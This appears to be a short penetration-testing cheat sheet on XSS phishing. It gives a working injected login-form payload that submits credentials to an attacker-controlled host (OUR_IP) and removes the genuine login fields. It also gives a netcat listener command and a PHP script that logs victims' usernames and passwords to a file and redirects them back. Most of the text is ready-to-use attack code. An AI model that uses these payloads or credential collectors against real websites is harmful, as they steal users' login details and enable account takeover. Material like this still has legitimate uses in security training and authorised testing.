# Phishing

## Overview

Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker.

A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server.

## Login form injection

We inject HTML code that displays a login form on the targeted page and sends the login information to a server we are listening on.

```console
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

We can write this using `document.write()` as a XSS payload, with the minified HTML code into a single line.

Furthermore, remove any fields that might discourage the user from using our fake login form with `document.getElementById().remove()`.

## Credential stealing

Start a simple `netcat` server to listen on the connection attempts through the fake login form.

```console
sudo nc -lvnp 80
```

We can also use a simple script (in this case PHP) that logs the credentials from the HTTP request and then returns the victim to the original page without any injections.

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

And then start the PHP listening server instead of netcat:

```console
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```
